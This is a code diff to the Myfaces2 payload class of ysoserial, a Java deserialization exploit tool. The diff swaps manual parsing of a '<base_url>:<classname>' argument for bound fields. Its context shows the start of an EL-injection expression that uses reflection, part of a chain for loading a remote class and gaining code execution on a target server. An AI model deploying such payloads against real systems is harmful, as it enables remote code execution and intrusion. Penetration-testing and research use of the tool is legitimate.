@@ -2,6 +2,10 @@ package ysoserial.payloads;
 
 
 
+import java.net.URL;
+
+import ysoserial.annotation.Bind;
+import ysoserial.interfaces.ObjectPayload;
 import ysoserial.payloads.annotation.PayloadTest;
 import ysoserial.payloads.util.PayloadRunner;
 
@@ -29,21 +33,24 @@ import ysoserial.payloads.util.PayloadRunner;
  */
 @PayloadTest ( harness = "ysoserial.payloads.MyfacesTest" )
 public class Myfaces2 implements ObjectPayload<Object>, DynamicDependencies {
+	
+	@Bind private URL url;
+	@Bind private String className;
     
     public static String[] getDependencies () {
         return Myfaces1.getDependencies();
     }
     
 
-    public Object getObject ( String command ) throws Exception {
-        int sep = command.lastIndexOf(':');
-        if ( sep < 0 ) {
-            throw new IllegalArgumentException("Command format is: <base_url>:<classname>");
-        }
+    /**
+	 * @deprecated Use {@link #getObject()} instead
+	 */
+	public Object getObject ( String command ) throws Exception {
+		return getObject();
+	}
 
-        String url = command.substring(0, sep);
-        String className = command.substring(sep + 1);
-        
+
+	public Object getObject ( ) throws Exception {
         // based on http://danamodio.com/appsec/research/spring-remote-code-with-expression-language-injection/
         String expr = "${request.setAttribute('arr',''.getClass().forName('java.util.ArrayList').newInstance())}";
         
